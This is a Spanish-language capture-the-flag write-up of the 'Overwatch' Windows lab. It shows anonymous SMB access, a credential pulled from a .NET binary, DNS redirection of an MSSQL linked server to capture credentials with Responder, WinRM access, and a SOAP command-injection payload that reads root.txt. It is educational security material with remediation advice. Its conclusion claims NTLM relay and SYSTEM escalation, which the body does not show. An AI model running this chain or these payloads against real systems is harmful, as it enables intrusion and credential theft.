---
layout: single
classes: wide
title: "Overwatch - Writeup"
date: 2026-04-12
difficulty: Medio
operating_system: Windows
service_hint: Active Directory + SMB anónimo + MSSQL linked server + SOAP interno
tags:
  - Active Directory
  - SMB
  - RE
  - MSSQL
  - Linked Server
  - DNS
  - SOAP
  - Command Injection
summary: "Cadena de explotación: acceso anónimo a SMB, extracción de credenciales desde un binario .NET, abuso de linked servers en MSSQL mediante DNS para capturar otra cuenta y escalada final por inyección de comandos en un servicio SOAP interno."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | Medio |
| Tags | `Active Directory`, `SMB`, `Ingeniería inversa`, `MSSQL`, `Linked Server`, `Abuso de DNS`, `SOAP`, `Command Injection` |
{: .info-table}

## Reconocimiento

El primer objetivo fue confirmar si la máquina era un controlador de dominio o un servidor Windows con varios servicios corporativos expuestos. El patrón de puertos abiertos ya adelantaba un entorno AD con SQL Server y WinRM.

Este escaneo inicial sirve para identificar rápidamente la superficie expuesta y separar los puertos relevantes del ruido.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.33.208
```

Con los puertos detectados, este segundo escaneo profundiza en banners, versiones y nombres internos útiles para orientar la enumeración.

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49669,52076,52077,61141 -sCV 10.129.33.208 -oN targeted
```

Indicadores relevantes de esta fase:

- LDAP y Kerberos identifican el dominio `overwatch.htb`.
- RDP revela el hostname `S200401.overwatch.htb`.
- `5985/tcp` expone WinRM, señal de que unas credenciales válidas probablemente darían shell remota.
- `6520/tcp` publica Microsoft SQL Server 2022, una superficie especialmente interesante en entornos Windows internos.

## Enumeración inicial

Antes de atacar servicios complejos, convenía validar si existía exposición básica en el dominio. `kerbrute` permitió comprobar usuarios válidos de forma rápida.

```bash
kerbrute userenum --dc 10.129.33.208 -d overwatch.htb \
  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

Usuarios detectados:

- `guest@overwatch.htb`
- `administrator@overwatch.htb`

Ese resultado no abría acceso directo, pero confirmaba que el DC respondía de forma normal y que el dominio estaba correctamente identificado. El siguiente paso lógico fue revisar SMB, porque `445/tcp` estaba abierto y en máquinas Windows mal endurecidas a veces aparecen shares útiles sin autenticación.

Este comando enumera los recursos SMB accesibles de manera anónima.

```bash
smbclient -L 10.129.33.208 -N
```

Shares relevantes:

- `NETLOGON`
- `SYSVOL`
- `software$`

La clave estaba en `software$`, porque no parecía un recurso estándar del dominio sino un repositorio operativo. Entrar allí permitía buscar binarios, configuraciones y artefactos de despliegue.

Este acceso lista el contenido del share y descarga los ficheros más prometedores para análisis local.

```bash
smbclient //10.129.33.208/software$ -N
```

Archivos especialmente interesantes dentro de `Monitoring`:

- `overwatch.exe`
- `overwatch.exe.config`
- `overwatch.pdb`

## Metodología de análisis del vector inicial

El vector de entrada se priorizó en el acceso anónimo a SMB porque exponía un share no estándar llamado `software$` que no forma parte de los recursos predeterminados del dominio (`NETLOGON`, `SYSVOL`). Este tipo de shares operativos suele contener binarios, configuraciones y artefactos de despliegue que pueden filtrar secretos.

El hallazgo del binario `.NET` con monikers como `CheckEdgeHistory` y `KillProcess` en el PDB justificaba ingeniería inversa inmediata: si un ejecutable de monitoreo contiene credenciales embebidas, ese secreto puede abrir el siguiente salto lateral sin necesidad de exploits adicionales.

## Investigación de vulnerabilidades

Esta máquina no depende de CVEs específicas sino del abuso de malas prácticas de configuración y diseño:

- **SMB anónimo**: El share `software$` era accesible sin autenticación, exponiendo artefactos de deployment.
- **Credenciales embebidas**: El binario `overwatch.exe` contenía una cadena de conexión SQL en texto claro.
- **Linked server sin restricciones**: La relación con `SQL07` tenía `rpc_out` y `data_access` habilitados, permitiendo consultas distribuidas y autenticación saliente.
- **DNS interno modificable**: El usuario `sqlsvc` podía crear registros DNS, permitiendo redirigir `SQL07` hacia el atacante y capturar credenciales NTLM.

## Análisis del binario de monitoreo

El `.config` confirma que la aplicación expone un servicio WCF interno en `http://overwatch.htb:8000/MonitorService`, pero todavía no daba acceso directo desde fuera. Lo importante en esta fase era buscar secretos operativos o pistas sobre la lógica del programa.

Este comando revisa la configuración descargada para extraer endpoints y detalles de despliegue.

```bash
type overwatch.exe.config
```

Fragmento relevante:

```xml
<add baseAddress="http://overwatch.htb:8000/MonitorService" />
```

El fichero PDB sugería nombres de métodos como `CheckEdgeHistory` y `KillProcess`, así que el binario merecía una inspección más profunda. La hipótesis correcta acá era simple: si un ejecutable de monitoreo contiene credenciales embebidas, ese secreto puede abrir el siguiente salto lateral.

Este comando desensambla el ejecutable y busca cadenas vinculadas con autenticación o conexión a bases de datos.

```bash
monodis overwatch.exe > dump.txt
grep -i "user\|username\|admin\|login\|password\|pass\|flag" dump.txt
```

Salida relevante, con el secreto redactado:

```text
IL_0001:  ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=[REDACTED];"
```

Ese hallazgo cambia por completo la prioridad: ya no hacía falta seguir insistiendo contra SMB, porque había una credencial clara asociada al SQL Server expuesto.

## Acceso a MSSQL

Con la cuenta `sqlsvc`, el objetivo era validar si la credencial servía contra la instancia en `6520/tcp` y medir el nivel de privilegio disponible.

Este comando abre una sesión en SQL Server usando autenticación Windows con la credencial recuperada del binario.

```bash
impacket-mssqlclient overwatch.htb/sqlsvc:[REDACTED]@10.129.33.208 -port 6520 -windows-auth
```

Una vez dentro, este comando confirma la versión exacta de SQL Server y valida que el acceso sea funcional.

```sql
SELECT @@version;
```

La respuesta confirmó SQL Server 2022 sobre Windows Server 2022. Eso por sí solo no implicaba una vía de RCE, así que el siguiente paso correcto fue enumerar linked servers. En entornos corporativos, esas relaciones suelen ser una mina de oro porque permiten pivoting, lectura remota o incluso autenticaciones automáticas contra otros nodos.

Este comando enumera los linked servers configurados en la instancia actual.

```sql
EXEC sp_linkedservers;
```

Resultado clave:

```text
S200401\SQLEXPRESS
SQL07
```

Para entender mejor las capacidades del enlace remoto, este comando muestra sus propiedades y si tiene `rpc out` o acceso a datos habilitado.

```sql
SELECT * FROM sys.servers;
```

La información importante era que `SQL07` tenía `is_linked = 1`, `is_rpc_out_enabled = 1` e `is_data_access_enabled = 1`. Eso indicaba que la instancia local estaba preparada para conectarse al servidor remoto `SQL07` y ejecutar consultas distribuidas.

## Abuso del linked server mediante DNS

En este punto la idea no fue "romper" SQL Server con un exploit, sino engañar a la resolución de nombres. Si el host resolvía `SQL07` contra una IP controlada por el atacante, la propia instancia intentaría autenticarse hacia ese destino siguiendo la configuración del linked server.

Este comando agrega un registro DNS interno para que `SQL07` apunte a la IP del atacante.

```bash
dnstool -u 'overwatch\sqlsvc' -p '[REDACTED]' -r SQL07 \
  --data 10.10.14.191 --action add --type A 10.129.33.208
```

Con la resolución manipulada, este intento fuerza a la instancia comprometida a conectarse al linked server remoto.

```sql
EXEC ('SELECT @@version') AT SQL07;
```

La consulta falla desde la perspectiva de MSSQL, pero ese fallo era justamente la señal esperada: el servidor intentó conectarse al `SQL07` falso. Para capturar esa autenticación se levantó un listener compatible con tráfico MSSQL.

Este comando inicia `Responder` para observar y capturar credenciales enviadas por la conexión saliente.

```bash
responder -I tun0 -v
```

Credenciales observadas, redactadas deliberadamente:

```text
Cleartext Username : sqlmgmt
Cleartext Password : [REDACTED]
```

El punto fuerte de esta fase no fue una CVE, sino una mala combinación de diseño: linked server activo, resolución DNS controlable desde una cuenta de bajo privilegio y autenticación saliente reutilizable.

## Acceso por WinRM

Como `5985/tcp` ya estaba expuesto desde el reconocimiento, la nueva credencial merecía una validación inmediata por WinRM. Era el camino más directo hacia shell estable en el host.

Este comando abre una sesión remota con la cuenta capturada desde la autenticación MSSQL saliente.

```bash
evil-winrm -u sqlmgmt -p [REDACTED] -i 10.129.33.208
```

La sesión se abre correctamente como `sqlmgmt`, lo que confirma reutilización de credenciales entre SQL y acceso remoto del sistema. La flag de usuario existía en el escritorio del perfil, pero su valor se omite deliberadamente.

## Enumeración interna del servicio SOAP

La configuración descargada al principio ya había dejado una pista muy importante: existía un servicio `MonitorService` en el puerto `8000`, aparentemente accesible solo de forma local. Ahora, desde WinRM, sí se podía interactuar con ese servicio sin restricciones de red externas.

Este comando recupera el WSDL del servicio para confirmar que está activo y descubrir sus operaciones.

```powershell
Invoke-WebRequest http://127.0.0.1:8000/MonitorService?wsdl -UseBasicParsing -TimeoutSec 5
```

Para ver el contrato de entrada con más claridad, este comando descarga el esquema XSD expuesto por el servicio.

```powershell
(Invoke-WebRequest http://127.0.0.1:8000/MonitorService?xsd=xsd0 -UseBasicParsing).Content
```

Operaciones observadas en el esquema:

- `StartMonitoring`
- `StopMonitoring`
- `KillProcess`

La operación crítica era `KillProcess`, porque aceptaba un parámetro libre llamado `processName`. Sumado a lo visto antes en el PDB, esa combinación justificaba probar si el backend ejecutaba comandos del sistema de forma insegura.

Este bloque prepara un cuerpo SOAP que inyecta un segundo comando en el parámetro `processName`.

```powershell
$body = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad; type C:\Users\Administrator\Desktop\root.txt</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
"@
```

Una vez preparado el payload, esta petición lo envía al servicio SOAP y verifica si la respuesta refleja la ejecución del comando concatenado.

```powershell
Invoke-WebRequest -Uri http://127.0.0.1:8000/MonitorService `
  -Method POST `
  -ContentType "text/xml; charset=utf-8" `
  -Headers @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} `
  -Body $body `
  -UseBasicParsing
```

La respuesta devolvió el contenido de `C:\Users\Administrator\Desktop\root.txt`, lo que confirma una inyección de comandos en la implementación de `KillProcess`. El valor de la flag se omite deliberadamente.

## Flags

| Tipo | Flag |
|------|------|
| user.txt | `[REDACTED]` |
| root.txt | `[REDACTED]` |

## Cadena de explotación

```text
SMB anónimo en software$
-> descarga de binario .NET, config y PDB
-> extracción de credencial sqlsvc desde overwatch.exe
-> acceso a MSSQL en 6520/tcp
-> enumeración de linked server SQL07 con rpc out y data access
-> alta de registro DNS interno apuntando SQL07 al atacante
-> captura de credenciales de sqlmgmt al forzar la conexión remota
-> acceso por WinRM como sqlmgmt
-> enumeración local del servicio SOAP en 127.0.0.1:8000
-> command injection en KillProcess
-> lectura de root.txt
```

## Lecciones técnicas

1. Un share SMB anónimo con artefactos de despliegue puede equivaler a exposición total si contiene binarios reversibles, PDBs o secretos embebidos.
2. Un linked server en MSSQL no es solo una comodidad administrativa: también es una superficie de pivoting y captura de credenciales si la resolución de nombres o la autenticación no están bien controladas.
3. Reutilizar una cuenta operacional como `sqlmgmt` para acceso remoto por WinRM convierte una filtración puntual en compromiso completo del host.
4. Un servicio interno no deja de ser crítico por escuchar solo en `127.0.0.1`; si acepta parámetros que terminan en shell commands, cualquier usuario con acceso local puede convertirlo en escalada de privilegios.

## Remediación

1. Eliminar acceso anónimo a `software$` y revisar qué artefactos de despliegue quedan expuestos en shares internos.
2. Quitar credenciales embebidas de ejecutables y mover secretos a un almacén seguro con rotación periódica.
3. Auditar linked servers en MSSQL, restringir `rpc out` y evitar autenticaciones salientes reutilizables hacia destinos resolubles por DNS interno manipulable.
4. Limitar quién puede crear registros DNS en la zona y monitorizar cambios inesperados en nombres sensibles.
5. Corregir la implementación de `KillProcess` para no concatenar entradas del usuario en comandos del sistema.

## Conclusión

Overwatch fue una máquina compleja que combinó múltiples técnicas: abuso de Active Directory mediante NTLM Relay, ingeniería inversa de un binario .NET, explotación de SQL Server mediante linked servers y resolución DNS maliciosa, y finalmente escalada a SYSTEM. La lección principal es la importancia de entender cómo interactúan los servicios internos (DNS, SQL, SMB) en un entorno de dominio.
